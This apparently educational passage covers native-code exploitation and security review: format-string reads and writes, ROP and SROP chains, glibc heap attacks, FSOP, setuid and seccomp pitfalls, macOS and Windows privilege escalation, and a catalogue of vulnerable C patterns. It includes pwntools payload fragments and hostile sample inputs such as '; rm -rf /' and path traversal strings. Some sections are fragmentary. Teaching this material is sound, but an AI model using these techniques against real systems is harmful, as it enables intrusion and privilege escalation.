  Also affected by: Full RELRO (blocks GOT overwrite as final target)

Format String Exploitation

Root Cause

printf(user_input);       // VULNERABLE — user controls the format grammar
printf("%s", user_input); // SAFE — user data is an argument, not the format

The first line lets the attacker control the format grammar. printf will read arguments that the caller never supplied — pulling values from the stack or registers.

This affects all printf-family functions: printf, fprintf, sprintf, snprintf, syslog, err, warn, and any custom wrappers.

How printf Works Internally

When printf is called:

printf("Name: %s, Age: %d, Score: %x", name, age, score);

1. printf parses the format string character by character
2. For each %specifier, it reads the NEXT argument:
   - On x86-64 System V: first 5 args from rsi, rdx, rcx, r8, r9
   - Then from stack
3. %s → dereference argument as pointer → print string
4. %d → print argument as signed integer
5. %x → print argument as hex integer
6. %n → WRITE number of bytes printed so far TO the address in the argument

When the Attacker Controls the Format String

char buf[256];
fgets(buf, sizeof(buf), stdin);
printf(buf);  // attacker sends "%x %x %x %x %x"

The attacker's %x specifiers consume values from registers and the stack that were never intended as printf arguments. These values may be:

  • Stack canary values
  • Return addresses (leaking code/libc addresses)
  • Pointers to other data
  • The attacker's own input (on the stack)

Read Primitives

Dumping Stack Values

Input: "%p %p %p %p %p %p %p %p"
Output: 0x7fff1234 0x40 0x7f4a5b6c 0x1 0x4141414141414141 ...

Each %p prints the next "argument" from registers/stack as a pointer.

Positional Parameters (Direct Access)

Instead of consuming arguments sequentially, you can access a specific position:

%N$p    — print the Nth argument as a pointer
%N$x    — print the Nth argument as hex
%N$s    — treat the Nth argument as a pointer, dereference as string
%N$n    — write to the address at the Nth argument position

Finding Your Input on the Stack

Your input string is on the stack. Find which offset corresponds to it:

Input:  AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Output: AAAA.0x7fff5678.0x40.0x0.(nil).0x4141414141414141...
                                       ^^^^^^^^^^^^^^^^^ offset 5 (example)

Or use positional parameters to probe:

AAAA%6$p → if output shows 0x4141414141414141, then offset = 6

Why this matters: Once you know the offset where your input appears, you can place an address in your input and reference it with %N$s (read) or %N$n (write).

Arbitrary Read

To read a string at any address:

from pwn import *

# Place target address at the right stack offset, then use %s to dereference it
target_addr = 0x404040  # e.g., GOT entry for puts
offset = 6             # where our input appears on the stack

# On 64-bit, addresses contain null bytes → put address AFTER format string
payload = f"%{offset + 1}$s".encode()
payload += b"PADDING"
payload += p64(target_addr)

64-bit complication: Addresses like 0x00404040 contain null bytes, which terminate the format string if placed at the beginning. Solution: put the address after the format specifiers.

Write Primitive — %n

%n writes the number of characters printed so far to the address pointed to by the argument.

int count;
printf("Hello%n", &count);
// count is now 5 (length of "Hello")

Size Variants

%n    → writes 4 bytes (int) or 8 bytes (long) depending on platform
%hn   → writes 2 bytes (short)
%hhn  → writes 1 byte (char)
%ln   → writes 8 bytes (long)

Why use %hhn?: Writing 1 byte at a time gives full control over what value is written, and avoids needing to print millions of characters.

Controlling the Write Value

%n writes the count of chars printed. Control the count with width specifiers:

%100c%N$n    → prints 100 chars of padding → writes 100 (0x64) to address at position N
%256c%N$hhn  → prints 256 chars → writes 0x00 (256 mod 256 = 0) to one byte

Writing an Arbitrary Value — Byte by Byte

To write 0xdeadbeef to address 0x404040:

Address + 0: write 0xef (least significant byte)
Address + 1: write 0xbe
Address + 2: write 0xad
Address + 3: write 0xde

Each write uses %hhn:

from pwn import *

target = 0x404040
values = [0xef, 0xbe, 0xad, 0xde]  # little-endian byte order

# For each byte, calculate the number of chars to print
# %hhn writes (total_chars_printed % 256) to target byte
# Use %Xc to control the count

Common Exploit Flows

Flow 1: Leak Canary + Overflow

1. Use format string to leak stack canary: %11$p (find the right offset)
2. Use a separate buffer overflow to overwrite return address
3. Include leaked canary in the right position

Flow 2: Leak libc + GOT Overwrite

1. Leak libc address: %s with GOT entry → get puts's actual address
2. Calculate libc base: leaked_puts - libc.symbols['puts']
3. Calculate system(): libc_base + libc.symbols['system']
4. Overwrite printf@GOT → system() using %n writes
5. Next time printf(user_input) is called → system(user_input) → send "/bin/sh"

Flow 3: Overwrite Return Address

1. Leak stack address from format string output
2. Calculate return address location
3. Use %n to write desired address (e.g., one_gadget) to return address
4. When function returns → shell

Flow 4: Overwrite __malloc_hook / __free_hook (glibc < 2.34)

1. Leak libc base
2. Calculate __malloc_hook or __free_hook address
3. Overwrite with one_gadget or system address using %n
4. Trigger malloc() or free() → shell

Return Oriented Programming (ROP)

Why ROP Exists

NX/DEP blocks injected shellcode by marking the stack and heap non-executable. ROP bypasses this by reusing code that is already in executable memory (.text sections of the binary and loaded libraries).

Core Concept: Gadgets

A gadget is a short sequence of instructions ending in ret:

pop rdi          ; load top of stack into rdi
ret              ; return to next address on stack

pop rsi
pop r15          ; sometimes gadgets include extra pops
ret

pop rdx
ret

The ret instruction pops the next 8 bytes from the stack into rip. By chaining gadgets on the stack, you control the instruction pointer at every step.

How a ROP Chain Works

Stack layout (after overflow):
┌─────────────────────┐  ← rsp after overflow
│ addr of gadget 1    │  → pop rdi; ret
├─────────────────────┤
│ value for rdi       │  → e.g., address of "/bin/sh"
├─────────────────────┤
│ addr of gadget 2    │  → pop rsi; ret
├─────────────────────┤
│ value for rsi       │  → e.g., 0 (NULL)
├─────────────────────┤
│ addr of gadget 3    │  → pop rdx; ret
├─────────────────────┤
│ value for rdx       │  → e.g., 0 (NULL)
├─────────────────────┤
│ addr of system()    │  → call system("/bin/sh")
└─────────────────────┘

Execution:
1. ret → pop rip = gadget1 addr → executes "pop rdi; ret"
2. pop rdi ← pops "/bin/sh" addr → ret → pop rip = gadget2 addr
3. pop rsi ← pops 0 → ret → pop rip = gadget3 addr  
4. pop rdx ← pops 0 → ret → pop rip = system() addr
5. system("/bin/sh") executes → shell!

ret2libc — The Simplest ROP

Before full ROP chains, there's ret2libc: directly call a libc function without any gadgets (on 32-bit) or with just one pop rdi gadget (on 64-bit).

64-bit ret2libc

Overflow payload:
┌──────────────────────────┐
│ 'A' * offset_to_ret_addr │  padding to reach saved RIP
├──────────────────────────┤
│ addr: pop rdi; ret       │  gadget to set first argument
├──────────────────────────┤
│ addr: "/bin/sh" string   │  argument for system()
├──────────────────────────┤
│ addr: ret (alignment)    │  extra ret for 16-byte stack alignment
├──────────────────────────┤
│ addr: system()           │  target function
└──────────────────────────┘

Requirements

  • Control RIP: Buffer overflow to overwrite return address.
  • Know addresses: Need to know system(), "/bin/sh", and gadget addresses.
  • Stack alignment: On x86-64, system() and other libc functions using SSE instructions (movaps) require 16-byte stack alignment. Add a single ret gadget as padding if needed.

payload += p64(pop_rdi)

payload += p64(pop_rsi)

payload += p64(shellcode_addr) # jump to shellcode

When you don't control enough stack space for a full ROP chain, pivot rsp to a larger controlled buffer:

# leave = mov rsp, rbp; pop rbp
# If you control rbp, you can set rsp to anywhere

payload = b'A' * (offset_to_rbp)

# ROP chain is pre-placed at controlled_buffer_addr

SROP (Sigreturn Oriented Programming)

sigreturn restores ALL registers from a signal frame on the stack. Forge a fake signal frame to set every register at once:

from pwn import *

frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = bin_sh_addr # "/bin/sh"
frame.rsi = 0
frame.rdx = 0

payload = b'A' * offset
payload += p64(pop_rax)

payload += p64(syscall_addr)
payload += bytes(frame)

One Gadgets

A one gadget (or magic gadget) is a single address in libc that, when jumped to, spawns a shell — provided certain register/stack constraints are met.

Heap Exploitation and FSOP

Why Heap Exploitation Matters

Many modern programs use dynamic memory extensively. Heap bugs are among the most common vulnerability classes in real-world software: browsers, media parsers, databases, and system services. Understanding heap internals is essential for both exploitation and code review.

ptmalloc2 Overview (glibc Allocator)

glibc uses ptmalloc2, a thread-aware allocator based on Doug Lea's dlmalloc. Key concepts:

┌──────────────────────────────────────────────────────────┐
│                    Heap Architecture                      │
├──────────────────────────────────────────────────────────┤
│  Arena       → Per-thread (or shared) heap management    │
│  Chunk       → Unit of allocation (includes metadata)    │
│  Bins        → Free lists organized by size              │
│  Top Chunk   → Large remaining chunk at end of heap      │
│  Wilderness  → Unallocated heap space                    │
└──────────────────────────────────────────────────────────┘

Chunk Structure

Every heap allocation has metadata before the user data:

Allocated Chunk

┌─────────────────────────────────────┐
│  prev_size (8 bytes)                │  ← Only used if previous chunk is free
├─────────────────────────────────────┤
│  size (8 bytes) | A | M | P         │  ← Size of this chunk + 3 flag bits
├─────────────────────────────────────┤  ← Pointer returned by malloc()
│                                     │
│  User data                          │
│                                     │
└─────────────────────────────────────┘

Free Chunk

┌─────────────────────────────────────┐
│  prev_size (8 bytes)                │
├─────────────────────────────────────┤
│  size (8 bytes) | A | M | P         │
├─────────────────────────────────────┤
│  fd (forward pointer)               │  ← Points to next free chunk in bin
├─────────────────────────────────────┤
│  bk (backward pointer)              │  ← Points to previous free chunk in bin
├─────────────────────────────────────┤
│  (additional data for large bins)    │
│  fd_nextsize, bk_nextsize           │
└─────────────────────────────────────┘

Flag Bits (lowest 3 bits of size field)

Flag Name Meaning
P (bit 0) PREV_INUSE Previous chunk is allocated (not free)
M (bit 1) IS_MMAPPED Chunk was allocated via mmap (not heap)
A (bit 2) NON_MAIN_ARENA Chunk belongs to a non-main arena (threaded)

Security note: The PREV_INUSE flag is critical. When it's 0, the allocator trusts prev_size to find the previous chunk — forging this enables backward consolidation attacks.

Minimum Chunk Size

On 64-bit: minimum chunk = 32 bytes (16 bytes metadata + 16 bytes data, due to alignment). Chunks are always 16-byte aligned.

malloc(1);   // actually allocates 32 bytes (minimum chunk)
malloc(24);  // allocates 32 bytes
malloc(25);  // allocates 48 bytes (next 16-byte boundary)

Bin System

When chunks are freed, they go into bins — linked lists organized by size:

Tcache (Thread-Local Cache) — glibc ≥ 2.26

Per-thread cache for fast allocation/deallocation.
- 64 bins, one per size class (24, 40, 56, ... up to 1032 bytes on 64-bit)
- Each bin holds up to 7 chunks (FIFO — last freed = first allocated)
- Singly linked list (only fd pointer used)
- Minimal security checks (fast, but vulnerable)
tcache_bins[0]: chunk_a → chunk_b → chunk_c → NULL   (size 0x20)
tcache_bins[1]: chunk_d → NULL                        (size 0x30)
...

Fastbins

- Sizes: 32, 48, 64, 80, 96, 112, 128 bytes (on 64-bit)
- Singly linked list (LIFO)
- No coalescing (never merged with neighbors)
- Used when tcache is full
- Double-free check: compares against list head only

Unsorted Bin

- Single bin, doubly linked list
- Acts as a "staging area" — recently freed chunks go here first
- During malloc, chunks are sorted from unsorted bin into small/large bins
- Key for exploitation: fd/bk point into main_arena (libc data)

Small Bins

- 62 bins for sizes 32 to 1008 bytes (multiples of 16)
- Doubly linked list (FIFO)
- Exact size matching

Large Bins

- 63 bins for sizes > 1008 bytes
- Sorted by size within each bin
- Uses fd_nextsize / bk_nextsize for fast size traversal

Allocation Search Order

malloc(size) search order:
1. Tcache → exact size match
2. Fastbin → exact size match (if tcache was full)
3. Small bin → exact size match (if size fits)
4. Unsorted bin → search, sort into small/large as you go
5. Large bin → best fit
6. Top chunk → split from wilderness
7. mmap → for very large allocations (> 128KB default)

Exploitation Techniques

Use-After-Free (UAF)

The most common heap vulnerability. Occurs when code uses a pointer after the memory has been freed.

struct User {
    int admin;      // offset 0
    char name[24];  // offset 4
};

struct Evil {
    int value;      // offset 0 — overlaps User.admin
};

// Step 1: Allocate and free
struct User *user = malloc(sizeof(struct User));  // 28 bytes → 32-byte chunk
user->admin = 0;
free(user);  // chunk goes to tcache/fastbin

// Step 2: Reallocate same size with attacker data
struct Evil *evil = malloc(sizeof(struct Evil));   // 4 bytes → 32-byte chunk (same!)
evil->value = 1;  // writes 1 to offset 0

// Step 3: Use stale pointer — type confusion
if (user->admin) {   // reads evil->value = 1
    grant_admin();    // PWNED!
}

Exploit pattern:

1. Allocate object A (type: User)
2. Free A (but pointer to A still exists somewhere)
3. Allocate object B of SAME SIZE (type: Evil) — gets A's memory
4. Use stale A pointer → interprets B's data as A's type
5. Control flow or data corruption

Double-Free

Freeing the same chunk twice corrupts the free list.

char *a = malloc(32);
free(a);
free(a);  // DOUBLE FREE — a is now in the free list TWICE

char *b = malloc(32);  // gets a's chunk
char *c = malloc(32);  // gets a's chunk AGAIN — b and c point to same memory!

Modern mitigation (tcache): glibc ≥ 2.29 added a key field in freed tcache chunks to detect double-free. Bypass: corrupt the key field before the second free, or free to different bins.

Tcache Poisoning

Corrupt the fd (next) pointer of a freed tcache chunk to make malloc return an arbitrary address.

Tcache bin (size 0x30):
  chunk_a.fd → chunk_b.fd → NULL

After corrupting chunk_a.fd → target_address:
  chunk_a.fd → target_address

malloc(0x20) → returns chunk_a
malloc(0x20) → returns target_address!  ← ARBITRARY ALLOCATION
// 1. Allocate two chunks of same size
char *a = malloc(0x20);
char *b = malloc(0x20);

// 2. Free both (go to tcache)
free(b);  // tcache: b → NULL
free(a);  // tcache: a → b → NULL

// 3. Overflow or UAF to overwrite a's fd pointer
*(size_t*)a = target_address;  // tcache: a → target_address

// 4. Allocate twice
malloc(0x20);  // returns a
char *evil = malloc(0x20);  // returns target_address!
// Now evil points to wherever we want — arbitrary read/write

Safe-linking (glibc ≥ 2.32): fd pointers in tcache and fastbins are now XOR'd with a random value (fd ^ ((&fd) >> 12)). This makes poisoning harder but not impossible if you can leak the heap address.

Unsorted Bin Leak (libc Address Leak)

When a chunk is freed into the unsorted bin (too large for tcache/fastbin, or tcache is full), its fd and bk pointers are set to point into main_arena in libc.

Unsorted bin:
  HEAD (main_arena+88) ↔ chunk ↔ HEAD

chunk.fd = &main_arena.top (in libc)
chunk.bk = &main_arena.top (in libc)

Exploit: If you can read a freed unsorted bin chunk's fd or bk, you get a libc pointer → calculate libc base.

# Typical flow:
# 1. Allocate chunk larger than tcache max (> 0x410 on 64-bit)
# 2. Allocate a guard chunk (prevent top chunk consolidation)
# 3. Free the large chunk → goes to unsorted bin
# 4. Read fd/bk from the freed chunk (via UAF or over-read)
# 5. Calculate: libc_base = leaked_value - offset_to_main_arena

big = malloc(0x420)
guard = malloc(0x10)  # prevent consolidation with top chunk
free(big)
# big->fd and big->bk now point into main_arena (libc)
leaked = *(size_t*)big  # via UAF
libc_base = leaked - 0x3ebca0  # offset depends on libc version

Fastbin Dup

Classic technique for older glibc (before tcache). Double-free with a different chunk in between to bypass the fastbin head check:

char *a = malloc(0x60);
char *b = malloc(0x60);

free(a);  // fastbin: a → NULL
free(b);  // fastbin: b → a → NULL
free(a);  // fastbin: a → b → a → NULL (circular!)

// Now malloc returns: a, b, a
// Write to a changes what the second allocation of a returns

Overlapping Chunks (Heap Overflow → Size Corruption)

Overflow one chunk to corrupt the size field of the next chunk:

Before overflow:
[chunk_A (0x30)] [chunk_B (0x30)] [chunk_C (0x30)]

Overflow A to corrupt B's size to 0x61:
[chunk_A (0x30)] [chunk_B (0x60 — fake!)] [chunk_C (0x30)]
                              ↑ now overlaps chunk_C

free(B) → allocator thinks B is 0x60 bytes
malloc(0x50) → get back B's memory, which overlaps C
→ can now read/write C's data through the overlapping allocation

File Stream Oriented Programming (FSOP)

_IO_FILE Structure

glibc uses _IO_FILE structures for stdin, stdout, stderr, and fopen'd files. These are linked in a global list _IO_list_all.

struct _IO_FILE {
    int _flags;               // 0x00: Magic + status flags
    char *_IO_read_ptr;       // 0x08
    char *_IO_read_end;       // 0x10
    char *_IO_read_base;      // 0x18
    char *_IO_write_base;     // 0x20
    char *_IO_write_ptr;      // 0x28
    char *_IO_write_end;      // 0x30
    char *_IO_buf_base;       // 0x38
    char *_IO_buf_end;        // 0x40
    // ... more fields ...
    char *_IO_save_base;
    char *_IO_backup_base;
    char *_IO_save_end;
    struct _IO_marker *_markers;
    struct _IO_FILE *_chain;  // 0xD8: linked list pointer
    int _fileno;              // 0xE0
    // ...
    size_t __pad5;
    int _mode;
    char _unused2[20];
    const struct _IO_jump_t *vtable;  // 0xD8 (64-bit): virtual function table
};

FSOP Attack Flow

1. Corrupt an _IO_FILE structure in memory (via heap overflow, UAF, etc.)
2. Trigger a vtable call: fclose(), fflush(), exit() (which flushes all streams)
3. The corrupted vtable pointer redirects to attacker-controlled function
4. Code execution!

Key FSOP Targets

Trigger When Called Exploitable?
fclose(fp) Explicit close Yes — calls _IO_finish via vtable
fflush(fp) Explicit flush Yes — calls _IO_overflow via vtable
exit() Program exit Yes — flushes all streams via _IO_flush_all_lockp
printf / puts When stdout buffer overflows Yes — calls _IO_overflow
Implicit flush At main return Yes — same as exit()

Modern Glibc Protections (≥ 2.24)

glibc added vtable validation: the vtable pointer must point within __libc_IO_vtables section.

Bypass techniques:

  • Use _IO_str_jumps or _IO_wstr_jumps vtables (valid, but have exploitable function pointers)
  • Corrupt _IO_FILE fields to control arguments passed to valid vtable functions
  • Target __malloc_hook/__free_hook instead (removed in glibc ≥ 2.34)
  • Use House of Apple techniques (glibc ≥ 2.34): abuse _IO_wfile_overflow → _wide_data->_wide_vtable

FSOP via stdout Leak

Corrupting stdout's _IO_FILE structure can force it to leak memory:

1. Set _IO_write_base to target address
2. Set _IO_write_ptr to target address + length
3. Set _flags to bypass checks (clear _IO_NO_WRITES, set _IO_CURRENTLY_PUTTING)
4. Trigger write (any printf/puts/write) → stdout writes from target address
5. Leaked data appears in program output!

setuid/setgid Binaries

How setuid Works

Normal execution:
  User runs /usr/bin/myapp → runs as user's UID

setuid execution:
  chmod u+s /usr/bin/myapp → setuid bit set
  User runs /usr/bin/myapp → runs as the FILE OWNER's UID (usually root)

Any bug in a setuid-root binary can lead to local privilege escalation.

setuid Review Checklist

  • PATH manipulation: Does the program call external commands without absolute paths?
  // VULNERABLE — attacker sets PATH=/tmp:$PATH and creates /tmp/cat
  system("cat /etc/shadow");
  
  // SAFER — use absolute path
  system("/bin/cat /etc/shadow");
  • Environment variable trust: Does it trust PATH, LD_*, HOME, TMPDIR, IFS?
  // VULNERABLE — user controls HOME
  snprintf(config, sizeof(config), "%s/.config/app.conf", getenv("HOME"));
  • TOCTOU (Time-of-Check to Time-of-Use): Does it check permissions then open the file separately?
  // VULNERABLE — race condition between access() and open()
  if (access(filename, R_OK) == 0) {
      // attacker replaces filename with symlink here
      fd = open(filename, O_RDONLY);  // opens attacker's target
  }
  
  // SAFER — open first, then check
  fd = open(filename, O_RDONLY | O_NOFOLLOW);
  fstat(fd, &st);  // check ownership/permissions on the opened fd
  • Predictable temp paths: Does it write to predictable temp file locations?
  // VULNERABLE — attacker creates symlink at /tmp/myapp.tmp
  fopen("/tmp/myapp.tmp", "w");
  
  // SAFER — use mkstemp
  int fd = mkstemp("/tmp/myapp.XXXXXX");
  • Privilege dropping: Does it drop privileges as soon as elevated operations are complete?
  // Correct order for dropping privileges:
  setgroups(0, NULL);       // drop supplementary groups
  setgid(target_gid);      // drop group FIRST
  setuid(target_uid);       // drop user LAST (can't go back)
  
  // WRONG — dropping user first means setgid may fail
  setuid(target_uid);
  setgid(target_gid);      // may not work if already unprivileged
  • Supplementary group sanitization: Does it clear supplementary groups?
  # Check what groups a setuid process inherits:
  id           # shows all groups
  # setuid program inherits ALL supplementary groups from the caller
  # Must explicitly call setgroups(0, NULL) to clear them

seccomp-bpf (Syscall Filtering)

How seccomp Works

seccomp restricts which system calls a process can make. It uses BPF (Berkeley Packet Filter) programs to filter syscalls.

Process makes syscall → seccomp BPF filter evaluates:
  → ALLOW  → syscall executes normally
  → KILL   → process is terminated (SIGSYS)
  → ERRNO  → syscall returns error
  → TRACE  → notify tracer (for debugging)
  → LOG    → allow but log

seccomp Audit Checklist

Common mistakes in seccomp policies:

Mistake Risk
Allowing openat broadly Attacker can open arbitrary files despite sandbox
Allowing ioctl without argument restrictions Many ioctls are dangerous (terminal control, device control)
Forgetting architecture checks 32-bit syscall numbers differ; attacker may use 32-bit ABI to bypass 64-bit filter
Allowing clone/unshare/mount Can create new namespaces, mount filesystems, escape sandbox
Allowing ptrace Can trace and inject into other sandboxed processes
Blocklist instead of allowlist Easy to miss new/obscure syscalls
Not filtering prctl Can use PR_SET_NO_NEW_PRIVS manipulation or other prctls

Analyzing seccomp Filters

# Dump seccomp filter of a running process:
cat /proc/<pid>/status | grep Seccomp
# 0 = disabled, 1 = strict, 2 = filter

# Use seccomp-tools to dump BPF:
# Install: gem install seccomp-tools
seccomp-tools dump ./sandboxed_binary

# Output shows which syscalls are allowed/denied

Bypass Techniques

1. x86 mode switch: If filter doesn't check architecture, use INT 0x80 (32-bit)
   to access different syscall numbers
2. Allowed syscall abuse: If open/read/write allowed, read sensitive files
3. Shared memory: If mmap allowed, use shared memory for IPC with unsandboxed process
4. Kernel bugs: Exploit kernel vulnerability from within sandbox

  1. Identify the service: Find the XPC service bundle and Mach service name.

     shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
       // Check code signing requirement
       SecRequirementRef requirement;
       SecRequirementCreateWithString(
         CFSTR("anchor apple generic and identifier \"com.example.app\""),
         kSecCSDefaultFlags, &requirement);
       
       // Validate the connecting process
       SecCodeRef code;
       SecCodeCopySelf(kSecCSDefaultFlags, &code);
       // ... validate against requirement ...
   }

       return YES;  // ANYONE can connect!
   }
  1. Review all message handlers: Every exposed method is attack surface.
  1. Validate authorization: Does the helper check authorization before performing privileged actions?
   // GOOD — check authorization before action
   - (void)installPackageAtPath:(NSString *)path 
     withAuthorization:(NSData *)authData {
       // Verify authData is a valid authorization ref
       // Check if user has right "com.example.install"
       // THEN perform privileged action
   }
   
   // BAD — no authorization check
   - (void)installPackageAtPath:(NSString *)path {
       // Just installs, no auth check!
       [NSFileManager copyItemAtPath:path toPath:@"/usr/local/bin/" error:nil];
   }
  1. Check path handling: Are paths canonicalized and symlink-safe before privileged file operations?

dylib Hijacking

How It Works

macOS loads dynamic libraries based on paths specified in the binary. If any path in the search order is writable by an attacker, they can plant a malicious dylib.

Audit Steps

# Check dependencies:
otool -L /path/to/binary

# Look for weak references (library not required):
otool -l /path/to/binary | grep -A2 LC_LOAD_WEAK_DYLIB

# Check for @rpath resolution:
otool -l /path/to/binary | grep -A5 LC_RPATH

# Check @rpath, @loader_path, @executable_path resolution:
# @rpath → resolved from LC_RPATH entries
# @loader_path → directory of the loading binary
# @executable_path → directory of the main executable

Vulnerability Conditions

1. Binary loads library from @rpath
2. One of the LC_RPATH entries resolves to writable directory
3. The library doesn't exist yet (or is a weak dependency)
4. Plant malicious dylib at the writable path → code execution

Mitigations:
- Hardened Runtime blocks DYLD_INSERT_LIBRARIES
- Library validation blocks unsigned dylibs (if enabled)
- SIP protects system directories

Control Flow Guard (CFG)

CFG validates indirect call targets at runtime. Only addresses in the "valid call target" bitmap are allowed.

Without CFG:
  call [rax]  → jumps anywhere rax points → exploitable

With CFG:
  call __guard_check_icall  → validates target
  call [rax]                → only if target is in valid set

Bypass: Find a valid call target that does something useful (e.g., VirtualProtect, ntdll!KiUserExceptionDispatcher).

TLS Callbacks

Thread Local Storage callbacks execute before main(). Malware uses them for anti-debug and initialization. Legitimate software rarely needs them.

Look in PE headers:
  IMAGE_DIRECTORY_ENTRY_TLS → TLS directory
  AddressOfCallBacks → array of callback function pointers

How UAC Works

Admin user logs in:
  → Gets TWO tokens:
    1. Filtered token (Medium integrity) → used by default
    2. Full admin token (High integrity) → used after UAC prompt

When elevation is needed:
  → UAC prompt appears → user approves → process gets High integrity token

Named Pipes

Named Pipe Security

Named pipe workflow:
1. Server creates pipe: \\.\pipe\MyPipe
2. Client connects
3. Server calls ImpersonateNamedPipeClient() → gets client's token
4. Server performs actions as client

Attack:
1. Attacker creates pipe first (pipe squatting)
2. Privileged process connects as client
3. Attacker calls ImpersonateNamedPipeClient()
4. Attacker has privileged token!

Named Pipe Review Checklist

  • Does the server impersonate clients? (Check for ImpersonateNamedPipeClient)
  • Are pipe ACLs too broad? (Check DACL on pipe creation)
  • Does the server verify client identity before privileged work?
  • Are impersonation levels constrained? (SecurityIdentification vs SecurityImpersonation)
  • Is the pipe name predictable? (Enables pipe squatting)

Potato Attacks

Potato-family attacks abuse Windows NTLM authentication via COM/pipes to escalate from service accounts to SYSTEM:

Hot Potato → NBNS spoofing + WPAD → NTLM relay → SYSTEM token
Rotten Potato → DCOM + pipe impersonation → SYSTEM token
Juicy Potato → Arbitrary CLSID COM activation → SYSTEM token  
Sweet Potato → Combines multiple techniques
PrintSpoofer → Abuse print spooler service pipe → SYSTEM token

Native Code Review Method

Overview

This phase bridges your existing web code review skills to native code. The core methodology is the same: trace untrusted input through the system, find places where security invariants are violated, and assess impact. The difference is in what "input" and "sinks" look like.

Review Workflow

Step 1: Map Trust Boundaries

Identify all sources of untrusted input:

┌──────────────────────────────────────────────────────────────┐
│                    Trust Boundary Map                         │
├──────────────────────────────────────────────────────────────┤
│  Command-line args  → argv, argc                            │
│  Environment vars   → getenv(), environ                     │
│  Files              → config files, data files, temp files  │
│  Network            → socket reads, HTTP, protocol parsing  │
│  IPC                → pipes, Unix sockets, XPC, D-Bus, COM  │
│  Plugins/modules    → dlopen'd libraries, loaded extensions │
│  User input (stdin) → scanf, fgets, read                    │
│  Shared memory      → mmap'd regions, SysV shm             │
│  Signals            → signal handlers (async context)       │
└──────────────────────────────────────────────────────────────┘

Step 2: Identify Privileged Code

Focus review on code that runs with elevated privileges:

Platform Privileged Components
Linux setuid/setgid binaries, capabilities, daemons running as root, kernel modules
macOS XPC helpers (root/privileged), launch daemons, kexts, entitled processes
Windows Windows services (SYSTEM), COM servers, named pipe servers, drivers
Cross-platform Network-facing daemons, file parsers processing untrusted data

Step 3: Follow Untrusted Input

Trace data flow from source to dangerous operations:

Source (untrusted)              Dangerous Operations (sinks)
─────────────────              ───────────────────────────
argv[1]              ──→       memcpy(buf, argv[1], len)
read(fd, buf, n)     ──→       strcpy(fixed_buf, buf)
getenv("HOME")       ──→       snprintf(path, sizeof(path), "%s/.config", home)
recv(sock, data, n)  ──→       *(int*)(base + offset) = value
fgets(line, ...)     ──→       printf(line)
XPC message field    ──→       system(command)

Step 4: Check Memory Safety

For every buffer operation, verify:

Check Question
Bounds Is dst large enough for the data being written?
Length validation Is the size/length argument validated before use?
Integer overflow Can count * sizeof(element) overflow before allocation?
Null termination Is the string properly null-terminated after copy?
Lifetime Is the pointer still valid (not freed, not out of scope)?
Initialization Is the memory initialized before being read or sent?
Alignment Is the pointer properly aligned for the type being accessed?

Step 5: Check Authorization

Key question: Who is allowed to trigger this action?

Web equivalent: Checking auth middleware before controller action
Native equivalent: Checking UID, capability, entitlement, or token before privileged operation

Common gaps:
- setuid binary trusts caller's environment without sanitization
- XPC helper doesn't validate connecting client's code signature
- Windows service accepts commands from any named pipe client
- Daemon checks PID instead of verifying code signature (PID can be reused)

Step 6: Check Failure Paths

Error handling is where many native bugs hide:

// Common pattern: resource allocated, error occurs, resource leaked or double-freed

char *buf = malloc(size);
if (!buf) return -1;

int fd = open(path, O_RDONLY);
if (fd < 0) {
    // BUG: buf is leaked! Missing free(buf)
    return -1;
}

ssize_t n = read(fd, buf, size);
if (n < 0) {
    close(fd);
    // BUG: buf is leaked! Missing free(buf)
    return -1;
}

// What if read returns partial data?
// What if size was 0?
// What if buf was freed in a different error path and we reach here again?

Checklist for failure paths:

  • Are all allocated resources freed on every error path?
  • Can any pointer be used after free on an error path?
  • Can any pointer be freed twice (error path + normal path)?
  • Are partially initialized structures safe to use?
  • Do early returns leave global/shared state inconsistent?

Step 7: Check Build Hardening

# Binary protections:
checksec --file=./binary

# Compiler flags to verify in build system:
# -fstack-protector-strong    (stack canaries)
# -D_FORTIFY_SOURCE=2         (bounds-checked libc wrappers)
# -Wformat -Wformat-security  (format string warnings)
# -pie -fPIE                  (position-independent executable)
# -z relro -z now             (full RELRO)
# -z noexecstack              (NX)

# Sanitizers in CI:
# -fsanitize=address          (heap/stack overflow, UAF)
# -fsanitize=undefined        (undefined behavior)
# -fsanitize=memory           (uninitialized reads — Clang only)

High-Risk Patterns Catalog

Memory Safety

// 1. Unbounded copy — classic buffer overflow
char buf[64];
strcpy(buf, user_input);      // if user_input > 63 bytes → overflow

// 2. Unchecked length in memcpy
memcpy(dst, src, user_length);  // if user_length > dst_size → overflow

// 3. Integer overflow before allocation
size_t total = count * sizeof(struct item);  // can overflow!
char *buf = malloc(total);                    // tiny allocation
memcpy(buf, data, count * sizeof(struct item)); // huge write

// 4. Missing null terminator
char buf[8];
strncpy(buf, "12345678", 8);  // NOT null-terminated if src >= n!
strlen(buf);                   // reads past buffer

// 5. Off-by-one
for (int i = 0; i <= len; i++)  // should be < len
    buf[i] = src[i];            // writes one byte past buf

Lifetime / Ownership

// 6. Use-after-free
free(session);
// ... later ...
if (session->active) { ... }  // UAF!

// 7. Double free
free(ptr);
if (error) { free(ptr); }  // second free if error occurs

// 8. Dangling pointer from realloc
ptr = realloc(ptr, new_size);  // if fails, ptr is NULL, old memory leaked
                                // if succeeds, old ptr is invalid

// 9. Stack pointer escape
char *get_name() {
    char buf[64];
    snprintf(buf, 64, "user_%d", id);
    return buf;  // returns pointer to stack frame that's about to be destroyed
}

Input Handling

// 10. Format string vulnerability
printf(user_input);           // user controls format → read/write memory
syslog(LOG_INFO, user_input); // same issue

// 11. Command injection
char cmd[256];
snprintf(cmd, sizeof(cmd), "convert %s output.png", filename);
system(cmd);  // if filename contains "; rm -rf /" → disaster

// 12. Path traversal
snprintf(path, sizeof(path), "/data/%s", user_filename);
// if user_filename = "../../../etc/passwd" → reads /etc/passwd
open(path, O_RDONLY);

// 13. TOCTOU race condition
if (access(path, W_OK) == 0) {
    // attacker replaces path with symlink to /etc/shadow HERE
    fd = open(path, O_WRONLY);  // opens /etc/shadow!
}

Signal Safety

// 14. Async-signal-unsafe function in signal handler
void handler(int sig) {
    printf("Caught signal %d\n", sig);  // printf is NOT async-signal-safe!
    malloc(100);                         // malloc is NOT async-signal-safe!
    free(ptr);                           // free is NOT async-signal-safe!
}
// Safe alternatives: write(), _exit(), sig_atomic_t flag variables

C++ Specific

// 15. RAII violation — resource leak on exception
void process() {
    FILE *f = fopen("data.txt", "r");
